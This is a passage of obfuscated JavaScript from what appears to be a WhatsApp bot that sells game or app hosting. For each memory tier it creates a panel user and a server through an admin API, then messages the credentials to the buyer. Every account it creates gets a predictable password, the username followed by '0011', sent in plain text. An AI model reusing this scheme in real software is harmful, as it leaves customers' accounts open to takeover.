          _0x2d94c9("SUCCES CREATE USER ID: " + _0x45f8e6.id);
          ctf = "Hai @" + _0x4bd2cc.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x45f8e6.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x5e830f + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x488b14.sendMessage(_0x4bd2cc, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x488b14.chat
          });
          let _0x2ed16c = await _0x15b24a.json();
          let _0x1e0d75 = _0x2ed16c.attributes.startup;
          let _0x2b22e2 = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': 'application/json',
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x2f56a9,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x45f8e6.id,
              'egg': parseInt(_0x49cbe0),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x1e0d75,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "25240",
                'swap': 0x0,
                'disk': "25240",
                'io': 0x1f4,
                'cpu': '700'
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x1040ef)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x34e9f2 = await _0x2b22e2.json();
          if (_0x34e9f2.errors) {
            return _0x2d94c9(JSON.stringify(_0x34e9f2.errors[0x0], null, 0x2));
          }
        }
        break;
      case "24gb":
        {
          if (!_0x55dc4 && !_0x14f0d6) {
            return _0x2d94c9(mess.only.premium);
          }
          let _0xf7c8d8 = _0x5592c0.split(',');
          if (_0xf7c8d8.length < 0x2) {
            return _0x2d94c9("*Format salah!*\nPenggunaan:\n" + (_0x28d847 + _0x1a8c03) + " user,nomer");
          }
          let _0x50b5f1 = _0xf7c8d8[0x0];
          let _0x2a746e = _0x257ec2.quoted ? _0x257ec2.quoted.sender : _0xf7c8d8[0x1] ? _0xf7c8d8[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x257ec2.mentionedJid[0x0];
          let _0x3dfcd2 = _0x50b5f1 + "24GB";
          let _0x538547 = global.eggsnya;
          let _0x23f3cf = global.location;
          let _0x26dbc9 = _0x50b5f1 + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x2a746e) {
            return;
          }
          let _0x22c16a = _0x50b5f1 + "0011";
          let _0x4762d7 = await fetch(domain + "/api/application/users", {
            'method': 'POST',
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x26dbc9,
              'username': _0x50b5f1,
              'first_name': _0x50b5f1,
              'last_name': _0x50b5f1,
              'language': 'en',
              'password': _0x22c16a
            })
          });
          let _0x32ed0b = await _0x4762d7.json();
          if (_0x32ed0b.errors) {
            return _0x2d94c9(JSON.stringify(_0x32ed0b.errors[0x0], null, 0x2));
          }
          let _0x2fad78 = _0x32ed0b.attributes;
          let _0x18a4a0 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x538547, {
            'method': "GET",
            'headers': {
              'Accept': 'application/json',
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x2d94c9("SUCCES CREATE USER ID: " + _0x2fad78.id);
          ctf = "Hai @" + _0x2a746e.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x2fad78.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x22c16a + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x488b14.sendMessage(_0x2a746e, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x488b14.chat
          });
          let _0x6d69f1 = await _0x18a4a0.json();
          let _0x250625 = _0x6d69f1.attributes.startup;
          let _0x16baa7 = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': 'application/json',
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x3dfcd2,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x2fad78.id,
              'egg': parseInt(_0x538547),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x250625,
              'environment': {
                'INST': 'npm',
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': '24240',
                'swap': 0x0,
                'disk': "24240",
                'io': 0x1f4,
                'cpu': "660"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x23f3cf)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x25bf4d = await _0x16baa7.json();
          if (_0x25bf4d.errors) {
            return _0x2d94c9(JSON.stringify(_0x25bf4d.errors[0x0], null, 0x2));
          }
        }
        break;
      case "23gb":
        {
          if (!_0x55dc4 && !_0x14f0d6) {
            return _0x2d94c9(mess.only.premium);
          }
          let _0x2e8b86 = _0x5592c0.split(',');
          if (_0x2e8b86.length < 0x2) {
            return _0x2d94c9("*Format salah!*\nPenggunaan:\n" + (_0x28d847 + _0x1a8c03) + " user,nomer");
          }
          let _0x175729 = _0x2e8b86[0x0];
          let _0x13d219 = _0x257ec2.quoted ? _0x257ec2.quoted.sender : _0x2e8b86[0x1] ? _0x2e8b86[0x1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : _0x257ec2.mentionedJid[0x0];
          let _0x3c2da1 = _0x175729 + "23GB";
          let _0x4d4441 = global.eggsnya;
          let _0x328824 = global.location;
          let _0x511f53 = _0x175729 + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x13d219) {
            return;
          }
          let _0x3f0716 = _0x175729 + "0011";
          let _0x2a60d6 = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x511f53,
              'username': _0x175729,
              'first_name': _0x175729,
              'last_name': _0x175729,
              'language': 'en',
              'password': _0x3f0716
            })
          });
          let _0x14f0d5 = await _0x2a60d6.json();
          if (_0x14f0d5.errors) {
            return _0x2d94c9(JSON.stringify(_0x14f0d5.errors[0x0], null, 0x2));
          }
          let _0x342339 = _0x14f0d5.attributes;
          let _0x2ff9e8 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x4d4441, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': 'application/json',
              'Authorization': "Bearer " + apikey
            }
          });
          _0x2d94c9("SUCCES CREATE USER ID: " + _0x342339.id);
          ctf = "Hai @" + _0x13d219.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x342339.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x3f0716 + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x488b14.sendMessage(_0x13d219, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x488b14.chat
          });
          let _0x384369 = await _0x2ff9e8.json();
          let _0x11aea9 = _0x384369.attributes.startup;
          let _0x34e6cc = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x3c2da1,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x342339.id,
              'egg': parseInt(_0x4d4441),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x11aea9,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "23240",
                'swap': 0x0,
                'disk': "23240",
                'io': 0x1f4,
                'cpu': "610"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x328824)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x247cd3 = await _0x34e6cc.json();
          if (_0x247cd3.errors) {
            return _0x2d94c9(JSON.stringify(_0x247cd3.errors[0x0], null, 0x2));
          }
        }
        break;
      case "22gb":
        {
          if (!_0x55dc4 && !_0x14f0d6) {
            return _0x2d94c9(mess.only.premium);
          }
          let _0x55ed0a = _0x5592c0.split(',');
          if (_0x55ed0a.length < 0x2) {
            return _0x2d94c9("*Format salah!*\nPenggunaan:\n" + (_0x28d847 + _0x1a8c03) + " user,nomer");
          }
          let _0xdcc664 = _0x55ed0a[0x0];
          let _0x1246d3 = _0x257ec2.quoted ? _0x257ec2.quoted.sender : _0x55ed0a[0x1] ? _0x55ed0a[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x257ec2.mentionedJid[0x0];
          let _0x330f77 = _0xdcc664 + '22GB';
          let _0x2cc78e = global.eggsnya;
          let _0x1ba78e = global.location;
          let _0x172ffd = _0xdcc664 + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x1246d3) {
            return;
          }
          let _0x527c84 = _0xdcc664 + "0011";
          let _0x17db5 = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x172ffd,
              'username': _0xdcc664,
              'first_name': _0xdcc664,
              'last_name': _0xdcc664,
              'language': 'en',
              'password': _0x527c84
            })
          });
          let _0x5f4fde = await _0x17db5.json();
          if (_0x5f4fde.errors) {
            return _0x2d94c9(JSON.stringify(_0x5f4fde.errors[0x0], null, 0x2));
          }
          let _0x1e757a = _0x5f4fde.attributes;
          let _0xba5900 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x2cc78e, {
            'method': 'GET',
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x2d94c9("SUCCES CREATE USER ID: " + _0x1e757a.id);
          ctf = "Hai @" + _0x1246d3.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x1e757a.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x527c84 + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x488b14.sendMessage(_0x1246d3, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x488b14.chat
          });
          let _0x416d40 = await _0xba5900.json();
          let _0x41cdc2 = _0x416d40.attributes.startup;
          let _0xd915a0 = await fetch(domain + '/api/application/servers', {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x330f77,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x1e757a.id,
              'egg': parseInt(_0x2cc78e),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x41cdc2,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "22240",
                'swap': 0x0,
                'disk': "22240",
                'io': 0x1f4,
                'cpu': "590"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x1ba78e)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x42763c = await _0xd915a0.json();
          if (_0x42763c.errors) {
            return _0x2d94c9(JSON.stringify(_0x42763c.errors[0x0], null, 0x2));
          }
        }
        break;
      case "21gb":
        {
          if (!_0x55dc4 && !_0x14f0d6) {
            return _0x2d94c9(mess.only.premium);
          }
          let _0x4f4851 = _0x5592c0.split(',');
          if (_0x4f4851.length < 0x2) {
            return _0x2d94c9("*Format salah!*\nPenggunaan:\n" + (_0x28d847 + _0x1a8c03) + " user,nomer");
          }
          let _0x5ea029 = _0x4f4851[0x0];
          let _0x6b744e = _0x257ec2.quoted ? _0x257ec2.quoted.sender : _0x4f4851[0x1] ? _0x4f4851[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x257ec2.mentionedJid[0x0];
          let _0xf92878 = _0x5ea029 + "21GB";
          let _0x1c2602 = global.eggsnya;
          let _0x2da363 = global.location;
          let _0x5af4bd = _0x5ea029 + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x6b744e) {
            return;
          }
          let _0x41804b = _0x5ea029 + "0011";
          let _0x1ddd3f = await fetch(domain + '/api/application/users', {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': 'application/json',
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x5af4bd,
              'username': _0x5ea029,
              'first_name': _0x5ea029,
              'last_name': _0x5ea029,
              'language': 'en',
              'password': _0x41804b
            })
          });
          let _0x3ee13f = await _0x1ddd3f.json();
          if (_0x3ee13f.errors) {
            return _0x2d94c9(JSON.stringify(_0x3ee13f.errors[0x0], null, 0x2));
          }
          let _0x1822f6 = _0x3ee13f.attributes;
          let _0x1d3c99 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x1c2602, {
            'method': "GET",
            'headers': {
              'Accept': 'application/json',
              'Content-Type': 'application/json',
              'Authorization': "Bearer " + apikey
            }
          });
          _0x2d94c9("SUCCES CREATE USER ID: " + _0x1822f6.id);
          ctf = "Hai @" + _0x6b744e.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x1822f6.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x41804b + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x488b14.sendMessage(_0x6b744e, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x488b14.chat
          });
          let _0x1b109d = await _0x1d3c99.json();
          let _0x3a2d3a = _0x1b109d.attributes.startup;
          let _0x27a342 = await fetch(domain + '/api/application/servers', {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0xf92878,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x1822f6.id,
              'egg': parseInt(_0x1c2602),
              'docker_image': 'ghcr.io/parkervcp/yolks:nodejs_18',
              'startup': _0x3a2d3a,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "21240",
                'swap': 0x0,
                'disk': "21240",
                'io': 0x1f4,
                'cpu': "570"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x2da363)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x4a9ef7 = await _0x27a342.json();
          if (_0x4a9ef7.errors) {
            return _0x2d94c9(JSON.stringify(_0x4a9ef7.errors[0x0], null, 0x2));
          }
        }
        break;
      case "20gb":
        {
          if (!_0x55dc4 && !_0x14f0d6) {
            return _0x2d94c9(mess.only.premium);
          }
          let _0x52cd84 = _0x5592c0.split(',');
          if (_0x52cd84.length < 0x2) {
            return _0x2d94c9("*Format salah!*\nPenggunaan:\n" + (_0x28d847 + _0x1a8c03) + " user,nomer");
          }
          let _0x3ee275 = _0x52cd84[0x0];
          let _0x30561d = _0x257ec2.quoted ? _0x257ec2.quoted.sender : _0x52cd84[0x1] ? _0x52cd84[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x257ec2.mentionedJid[0x0];
          let _0x402973 = _0x3ee275 + "20GB";
          let _0x757b03 = global.eggsnya;
          let _0x5287fd = global.location;
          let _0x3427cf = _0x3ee275 + '1398@gmail.com';
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x30561d) {
            return;
          }
          let _0x3dc267 = _0x3ee275 + "0011";
          let _0xf25498 = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': 'application/json',
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x3427cf,
              'username': _0x3ee275,
              'first_name': _0x3ee275,
              'last_name': _0x3ee275,
              'language': 'en',
              'password': _0x3dc267
            })
          });
          let _0x414964 = await _0xf25498.json();
          if (_0x414964.errors) {
            return _0x2d94c9(JSON.stringify(_0x414964.errors[0x0], null, 0x2));
          }
          let _0x12bd3a = _0x414964.attributes;
          let _0x4a5e91 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x757b03, {
            'method': 'GET',
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x2d94c9("SUCCES CREATE USER ID: " + _0x12bd3a.id);
          ctf = "Hai @" + _0x30561d.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x12bd3a.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x3dc267 + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x488b14.sendMessage(_0x30561d, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x488b14.chat
          });
          let _0x34048f = await _0x4a5e91.json();
          let _0x78b7d5 = _0x34048f.attributes.startup;
          let _0x534d37 = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': 'application/json',
              'Content-Type': 'application/json',
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x402973,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x12bd3a.id,
              'egg': parseInt(_0x757b03),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x78b7d5,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "20240",
                'swap': 0x0,
                'disk': "20240",
                'io': 0x1f4,
                'cpu': "530"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x5287fd)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x21e08b = await _0x534d37.json();
          if (_0x21e08b.errors) {
            return _0x2d94c9(JSON.stringify(_0x21e08b.errors[0x0], null, 0x2));
          }
        }
        break;
      case '19gb':
        {
          if (!_0x55dc4 && !_0x14f0d6) {
            return _0x2d94c9(mess.only.premium);
          }
          let _0x20e38a = _0x5592c0.split(',');
          if (_0x20e38a.length < 0x2) {
            return _0x2d94c9("*Format salah!*\nPenggunaan:\n" + (_0x28d847 + _0x1a8c03) + " user,nomer");
          }
          let _0x2a94fb = _0x20e38a[0x0];
          let _0x4dbee4 = _0x257ec2.quoted ? _0x257ec2.quoted.sender : _0x20e38a[0x1] ? _0x20e38a[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x257ec2.mentionedJid[0x0];
          let _0xf41051 = _0x2a94fb + "19GB";
          let _0x5d5666 = global.eggsnya;
          let _0x48a596 = global.location;
          let _0x42d6e6 = _0x2a94fb + '1398@gmail.com';
          akunlo = 'https://telegra.ph/file/3d91b41617cb982acf0c4.jpg';
          if (!_0x4dbee4) {
            return;
          }
          let _0x298ada = _0x2a94fb + "0011";
          let _0xf00016 = await fetch(domain + '/api/application/users', {
            'method': "POST",
            'headers': {
              'Accept': 'application/json',
              'Content-Type': 'application/json',
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x42d6e6,
              'username': _0x2a94fb,
              'first_name': _0x2a94fb,
              'last_name': _0x2a94fb,
              'language': 'en',
              'password': _0x298ada
            })
          });
          let _0xc963af = await _0xf00016.json();
          if (_0xc963af.errors) {
            return _0x2d94c9(JSON.stringify(_0xc963af.errors[0x0], null, 0x2));
          }
          let _0x5bba6d = _0xc963af.attributes;
          let _0x3ec9a6 = await fetch(domain + '/api/application/nests/5/eggs/' + _0x5d5666, {
            'method': "GET",
            'headers': {
              'Accept': 'application/json',
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x2d94c9("SUCCES CREATE USER ID: " + _0x5bba6d.id);
          ctf = "Hai @" + _0x4dbee4.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x5bba6d.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x298ada + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x488b14.sendMessage(_0x4dbee4, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x488b14.chat
          });
          let _0xa3127d = await _0x3ec9a6.json();
          let _0x2abf70 = _0xa3127d.attributes.startup;
          let _0x268e51 = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0xf41051,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
